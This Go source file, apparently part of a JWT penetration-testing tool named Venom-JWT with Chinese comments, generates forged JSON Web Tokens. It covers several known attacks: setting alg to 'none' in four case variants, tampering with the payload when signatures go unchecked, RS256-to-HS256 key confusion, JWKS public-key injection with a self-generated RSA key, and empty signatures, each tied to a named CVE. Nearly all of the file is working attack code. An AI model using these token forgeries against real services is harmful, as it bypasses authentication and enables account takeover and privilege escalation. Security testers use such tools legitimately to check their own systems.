package service

import (
	"Venom-JWT/content"
	"Venom-JWT/model"
	"Venom-JWT/utils"
	"crypto"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"github.com/gookit/color"
	"io/ioutil"
	"math/big"
	"os"
	"strings"
)

var jwtArr = make([]string, 0)

// 设置alg为none
func setAlgNone(jwtObj *model.Jwt, noneStr string) {

	jwtObj.SetAlgorithm(noneStr)
}

// JWT为None的情况
func jwtAlgNoneType(jwtObj model.Jwt, noneType string) {
	setAlgNone(&jwtObj, noneType)
	headerStr, err := jwtObj.HeaderToString()
	if err != nil {
		color.Println("\n<red>[-]</> Error:" + err.Error())
		return
	}
	var jwtStr = utils.EncodeJWT(headerStr) + "." + utils.EncodeJWT(jwtObj.Payload) + "."
	jwtArr = append(jwtArr, jwtStr)
	color.Println("\n<magentaB>[+]</>【alg为" + noneType + "】: <primary>" + jwtStr + "</>")
}

// JWT改为None的情况
func JwtAlgNoneService(jwt model.Jwt) {
	color.Println("\n<blue>①</> 大部分情况在alg为HS256时候，可以将JWT改为none的情况(CVE-2015-9235)")
	var noneTypes = []string{"none", "None", "NoNe", "NONE"}
	for _, typeStr := range noneTypes {
		jwtAlgNoneType(jwt, typeStr)
	}
}

// 未验证签名导致的越权
func JwtWithNoCheck(firstBodyStr string, secondBodyStr string, thirdBodyStr string) {
	color.Println("\n<blue>②</> 未验证签名攻击(无效签名攻击)：修改Payload不校验(需要修改payload)")
	var jwtStr = firstBodyStr + "." + utils.EncodeJWT(secondBodyStr) + "." + thirdBodyStr
	jwtArr = append(jwtArr, jwtStr)
	color.Println("\n<magentaB>[+]</>【未验证签名攻击(无效签名攻击)】: <primary>" + jwtStr + "</>")
}

// 修改非对称密码算法为对称密码算法(CVE-2016-10555)
func JwtModifyAsymToSym(jwtObj model.Jwt, pemPath string) {
	if strings.ToUpper(jwtObj.GetAlgorithm()) == "RS256" {
		color.Println("\n<yellow>提示：</>该JWT非RS256不进行alg为HS256(CVE-2016-10555)的修改")
		return
	}
	color.Println("\n<blue>③</> 修改非对称密码算法为对称密码算法(CVE-2016-10555)攻击")
	key := ""
	if pemPath != "" {
		keyBytes, err := ioutil.ReadFile(pemPath)
		if err != nil {
			fmt.Println("\n<red>[-]</> " + err.Error())
			os.Exit(1)
		}
		key = string(keyBytes)
	} else {
		key = content.JWT_MODIFY_AS_TO_SYM
	}

	header := utils.CreateHS256Header(jwtObj.Header)
	payload := utils.EncodeJWT(jwtObj.Payload)

	token := header + "." + payload
	h := hmac.New(sha256.New, []byte(key))
	h.Write([]byte(token))
	sig := base64.RawURLEncoding.EncodeToString(h.Sum(nil))
	sig = strings.TrimRight(sig, "=")
	jwtStr := token + "." + sig
	jwtArr = append(jwtArr, jwtStr)
	color.Println("\n<magentaB>[+]</> 【修改非对称密码算法为对称密码算法】:<primary>" + jwtStr + "</>")
}

// 伪造密钥(CVE-2018-0114)
func JwtWithFakeKey(jwtBody string) {
	color.Println("\n<blue>④</> JWKS公钥注入--伪造密钥(CVE-2018-0114)攻击")
	payloadB64 := base64.RawURLEncoding.EncodeToString([]byte(jwtBody))
	privKey, pubKey, err := utils.GenRsaPrivKey()
	if err != nil {
		color.Println("\n<red>[-]</>" + err.Error())
	}
	if err := utils.WritePubKeyToFile(pubKey); err != nil {
		color.Println("\n<red>[-]</>" + err.Error())
	}

	if err := utils.WritePrivKeyToFile(privKey); err != nil {
		color.Println("<red>[-]</>" + err.Error())
	}
	nB64 := base64.RawURLEncoding.EncodeToString(pubKey.N.Bytes())
	exp := big.NewInt(int64(pubKey.E))
	eB64 := base64.RawURLEncoding.EncodeToString(exp.Bytes())
	headersB64 := utils.GetHeadersB64(nB64, eB64)
	data := headersB64 + "." + payloadB64
	hash := sha256.Sum256([]byte(data))
	sign, err := rsa.SignPKCS1v15(rand.Reader, privKey, crypto.SHA256, hash[:])
	if err != nil {
		color.Println("<red>[-]</>" + err.Error())
	}
	signB64 := base64.RawURLEncoding.EncodeToString(sign)
	jwtStr := data + "." + signB64
	jwtArr = append(jwtArr, jwtStr)
	color.Println("\n<magentaB>[+]</>【伪造密钥】: <primary>" + jwtStr + "</>")
}

// 空签名
func JwtNullSecret(firstBodyStr string, payload string) {
	color.Println("\n<blue>⑤</> 空签名(CVE-2020-28042)攻击")
	jwtStr := firstBodyStr + "." + utils.EncodeJWT(payload) + "."
	jwtArr = append(jwtArr, jwtStr)
	color.Println("\n<magentaB>[+]</>【空签名】: <primary>" + jwtStr + "</>")
}
